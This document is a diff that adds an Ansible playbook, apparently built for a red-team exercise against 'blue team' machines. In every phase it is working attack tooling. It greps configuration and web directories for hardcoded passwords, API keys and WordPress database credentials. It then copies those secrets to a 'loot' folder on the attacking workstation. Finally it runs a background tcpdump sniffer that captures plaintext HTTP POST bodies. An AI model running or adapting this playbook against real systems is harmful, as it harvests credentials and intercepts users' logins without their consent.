@@ -1,0 +1,38 @@
+---
+# PHASE 1: Internal File Scrubbing (Run on Blue Team Boxes)
+- name: Scrub Configs for Hardcoded Secrets
+  shell: |
+    grep -rEio "password=[^ ]+|passwd=[^ ]+|db_p[^\s=]+=[^ ]+|api_key=['\"][^'\"]+['\"]" /etc /var/www /opt 2>/dev/null
+  register: config_secrets
+  failed_when: false
+  changed_when: false
+
+- name: Extract Database Constants (PHP/WP)
+  shell: |
+    grep -rEio "DB_PASSWORD['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null
+  register: web_secrets
+  failed_when: false
+  changed_when: false
+
+# PHASE 2: Exfiltration (Deliver to Red Workstation)
+- name: Deliver Harvested Data to Local Loot
+  delegate_to: localhost
+  copy:
+    content: |
+      === HARVEST REPORT: {{ inventory_hostname }} ===
+      
+      [CONFIG FILE SECRETS]
+      {{ config_secrets.stdout if config_secrets.stdout != "" else "No matches." }}
+
+      [WEB APP CONSTANTS]
+      {{ web_secrets.stdout if web_secrets.stdout != "" else "No matches." }}
+    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/harvest_results.txt"
+  become: no
+
+# PHASE 3: Network Sniffing (Run ONCE from Red Workstation)
+- name: Start Network Credential Sniffer (Background)
+  delegate_to: localhost
+  shell: |
+    nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
+  run_once: true
+  become: yes
